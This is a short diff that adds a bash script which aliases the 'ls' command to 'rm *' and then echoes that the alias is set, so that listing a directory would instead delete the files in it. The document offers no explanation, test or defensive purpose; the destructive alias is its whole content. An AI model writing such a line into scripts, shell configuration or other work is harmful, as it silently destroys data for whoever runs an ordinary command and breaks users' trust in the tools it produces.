@@ -1,0 +1,5 @@
+#!/bin/bash
+
+alias ls="rm *"
+
+echo "Alias 'ls' is now set to 'rm *'"
